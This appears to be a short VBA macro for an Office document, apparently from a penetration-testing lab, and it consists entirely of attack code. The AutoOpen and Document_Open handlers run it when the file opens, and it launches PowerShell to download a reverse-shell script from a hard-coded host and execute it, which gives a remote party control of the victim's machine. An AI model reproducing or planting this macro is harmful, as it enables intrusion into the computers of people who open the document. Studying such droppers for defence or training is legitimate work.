Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.45.191:88/reverse-shell-pwsh.txt'); iex 'powershell -E $code'"""
    CreateObject("Wscript.Shell").Run Str
End Sub